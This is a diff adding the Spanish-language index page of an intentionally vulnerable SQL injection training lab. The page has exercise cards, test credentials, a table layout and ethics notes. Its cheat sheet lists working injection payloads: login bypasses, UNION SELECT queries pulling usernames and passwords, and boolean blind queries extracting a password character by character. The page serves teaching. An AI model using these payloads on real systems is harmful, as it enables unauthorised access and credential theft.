@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔒 Laboratorio SQL Injection</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <h1>🔒 Laboratorio de SQL Injection</h1>
+            <p class="subtitle">Entorno educativo para aprender ciberseguridad</p>
+        </header>
+        
+        <div class="warning-box">
+            <div class="warning-icon">⚠️</div>
+            <div class="warning-text">
+                <strong>ATENCIÓN:</strong> Esta aplicación es <strong>intencionalmente vulnerable</strong>.<br>
+                Solo para uso educativo en entornos controlados.
+            </div>
+        </div>
+        
+        <div class="main-content">
+            <section class="exercises">
+                <h2>🎯 Ejercicios Disponibles</h2>
+                <div class="exercise-grid">
+                    
+                    <div class="exercise-card">
+                        <div class="exercise-icon">🔑</div>
+                        <h3>Ejercicio 1: Login Bypass</h3>
+                        <p>Aprende a evadir la autenticación usando SQL injection básico</p>
+                        <div class="exercise-details">
+                            <strong>Técnicas:</strong> Comentarios SQL, OR logic
+                        </div>
+                        <a href="/login" class="btn btn-primary">Iniciar Ejercicio</a>
+                    </div>
+                    
+                    <div class="exercise-card">
+                        <div class="exercise-icon">🔍</div>
+                        <h3>Ejercicio 2: Union-Based</h3>
+                        <p>Extrae datos usando UNION SELECT para combinar consultas</p>
+                        <div class="exercise-details">
+                            <strong>Técnicas:</strong> UNION SELECT, extracción de datos
+                        </div>
+                        <a href="/search" class="btn btn-primary">Iniciar Ejercicio</a>
+                    </div>
+                    
+                    <div class="exercise-card">
+                        <div class="exercise-icon">👤</div>
+                        <h3>Ejercicio 3: Blind Injection</h3>
+                        <p>Extrae información cuando no hay salida visible directa</p>
+                        <div class="exercise-details">
+                            <strong>Técnicas:</strong> Boolean-based, inferencia
+                        </div>
+                        <a href="/user/1" class="btn btn-primary">Ver API</a>
+                    </div>
+                    
+                    <div class="exercise-card">
+                        <div class="exercise-icon">⏱️</div>
+                        <h3>Ejercicio 4: Time-Based</h3>
+                        <p>Detecta vulnerabilidades basándose en el tiempo de respuesta</p>
+                        <div class="exercise-details">
+                            <strong>Técnicas:</strong> Time delays, inferencia temporal
+                        </div>
+                        <a href="/product/1" class="btn btn-primary">Ver API</a>
+                    </div>
+                    
+                </div>
+            </section>
+            
+            <section class="cheatsheet">
+                <h2>📋 Guía Rápida de Payloads</h2>
+                <div class="payload-section">
+                    <h3>🔑 Login Bypass</h3>
+                    <div class="payload-list">
+                        <code class="payload">admin' --</code>
+                        <code class="payload">admin' OR '1'='1</code>
+                        <code class="payload">' OR 1=1 --</code>
+                        <code class="payload">admin') --</code>
+                    </div>
+                </div>
+                
+                <div class="payload-section">
+                    <h3>🔍 Union-Based Injection</h3>
+                    <div class="payload-list">
+                        <code class="payload">' UNION SELECT 1,username,password,email FROM users --</code>
+                        <code class="payload">test' UNION SELECT id,username,email,role FROM users --</code>
+                        <code class="payload">' UNION SELECT null,null,null,null --</code>
+                    </div>
+                </div>
+                
+                <div class="payload-section">
+                    <h3>👤 Blind Injection</h3>
+                    <div class="payload-list">
+                        <code class="payload">1' AND 1=1 --</code>
+                        <code class="payload">1' AND 1=2 --</code>
+                        <code class="payload">1' AND (SELECT COUNT(*) FROM users)>0 --</code>
+                        <code class="payload">1' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a' --</code>
+                    </div>
+                </div>
+            </section>
+            
+            <section class="database-info">
+                <h2>🗄️ Información de la Base de Datos</h2>
+                <div class="info-grid">
+                    <div class="info-card">
+                        <h4>👥 Usuarios de Prueba</h4>
+                        <ul>
+                            <li><strong>admin</strong> / admin123 (administrator)</li>
+                            <li><strong>user1</strong> / password (user)</li>
+                            <li><strong>guest</strong> / guest123 (guest)</li>
+                            <li><strong>manager</strong> / manager456 (manager)</li>
+                            <li><strong>developer</strong> / dev789 (developer)</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="info-card">
+                        <h4>🗂️ Estructura de Tablas</h4>
+                        <ul>
+                            <li><strong>users:</strong> id, username, password, email, role</li>
+                            <li><strong>products:</strong> id, name, price, description</li>
+                        </ul>
+                        <a href="/info" class="btn btn-secondary btn-small">Ver Info Completa (JSON)</a>
+                    </div>
+                </div>
+            </section>
+            
+            <section class="learning-objectives">
+                <h2>🎓 Objetivos de Aprendizaje</h2>
+                <div class="objectives-grid">
+                    <div class="objective">
+                        <span class="objective-number">1</span>
+                        <div>
+                            <h4>Identificar Vulnerabilidades</h4>
+                            <p>Reconocer código vulnerable a SQL injection</p>
+                        </div>
+                    </div>
+                    <div class="objective">
+                        <span class="objective-number">2</span>
+                        <div>
+                            <h4>Explotar de Forma Ética</h4>
+                            <p>Usar técnicas de pentesting en entorno controlado</p>
+                        </div>
+                    </div>
+                    <div class="objective">
+                        <span class="objective-number">3</span>
+                        <div>
+                            <h4>Implementar Contramedidas</h4>
+                            <p>Aplicar técnicas de programación segura</p>
+                        </div>
+                    </div>
+                    <div class="objective">
+                        <span class="objective-number">4</span>
+                        <div>
+                            <h4>Entender el Impacto</h4>
+                            <p>Comprender las consecuencias de las vulnerabilidades</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+        
+        <footer class="footer">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h4>🎯 Recursos Adicionales</h4>
+                    <ul>
+                        <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP SQL Injection</a></li>
+                        <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger Academy</a></li>
+                        <li><a href="https://sqlzoo.net/" target="_blank">SQL Zoo (Práctica SQL)</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-section">
+                    <h4>⚖️ Aspectos Éticos</h4>
+                    <ul>
+                        <li>Solo usar en entornos controlados</li>
+                        <li>Obtener autorización antes de testear</li>
+                        <li>Reportar vulnerabilidades responsablemente</li>
+                        <li>Seguir principios de ethical hacking</li>
+                    </ul>
+                </div>
+                
+                <div class="footer-section">
+                    <h4>🔧 Utilidades</h4>
+                    <button onclick="resetDatabase()" class="btn btn-secondary">Reiniciar Base de Datos</button>
+                    <button onclick="toggleConsole()" class="btn btn-secondary">Toggle Consola</button>
+                </div>
+            </div>
+            
+            <div class="footer-bottom">
+                <p>🎓 Laboratorio educativo - Ingeniería de Sistemas - Ciberseguridad</p>
+                <p>⚠️ Uso exclusivo con fines educativos</p>
+            </div>
+        </footer>
+    </div>
+    
+    <script>
+        // Función para reiniciar la base de datos
+        async function resetDatabase() {
+            if (confirm('¿Estás seguro de que quieres reiniciar la base de datos?')) {
+                try {
+                    const response = await fetch('/reset-database', { method: 'POST' });
+                    const result = await response.json();
+                    
+                    if (result.status === 'success') {
+                        alert('✅ Base de datos reiniciada correctamente');
+                    } else {
+                        alert('❌ Error: ' + result.message);
+                    }
+                } catch (error) {
+                    alert('❌ Error de conexión: ' + error.message);
+                }
+            }
+        }
+        
+        // Toggle para mostrar/ocultar consola de desarrollo
+        function toggleConsole() {
+            if (typeof console !== 'undefined') {
+                if (console.log.toString().indexOf('[native code]') === -1) {
+                    // Consola está deshabilitada, rehabilitarla
+                    console = window.console;
+                    alert('✅ Consola habilitada - Presiona F12 para ver queries SQL');
+                } else {
+                    alert('ℹ️ Presiona F12 para abrir la consola del navegador y ver las queries SQL ejecutadas');
+                }
+            }
+        }
+        
+        // Mostrar tips al cargar la página
+        window.addEventListener('load', function() {
+            console.log('🔒 LABORATORIO SQL INJECTION CARGADO');
+            console.log('💡 TIP: Las queries SQL se mostrarán en esta consola');
+            console.log('🎯 Objetivo: Aprender a identificar y explotar vulnerabilidades de forma ética');
+        });
+    </script>
+</body>
+</html>
